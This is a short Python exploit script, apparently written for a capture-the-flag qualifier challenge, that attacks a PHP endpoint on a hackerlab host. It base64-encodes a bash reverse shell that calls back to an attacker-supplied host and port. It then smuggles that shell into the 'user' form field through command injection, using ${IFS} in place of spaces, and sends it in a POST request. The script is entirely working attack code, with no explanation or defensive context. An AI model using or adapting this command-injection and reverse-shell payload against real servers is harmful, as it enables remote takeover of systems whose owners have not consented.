import requests
from base64 import b64encode
import sys

url = "http://qualif.hackerlab.bj:1003/student/processes/staff.process.php"
host = sys.argv[1]
port = sys.argv[2]

sh = f'sh -i >& /dev/tcp/{host}/{port} 0>&1'
payload = b64encode(sh.encode()).decode()
req_payload = "-i;echo${{IFS}}'{}'|base64${{IFS}}-d|bash;echo".format(payload)
print(req_payload)
data = {
    "func":"fillBranchSelector",
    "tutionId":"T9324742",
    "user": req_payload
}

proxy = {'http': 'http://127.0.0.1:8080'}

response = requests.post(url, data=data)

print(response.text)
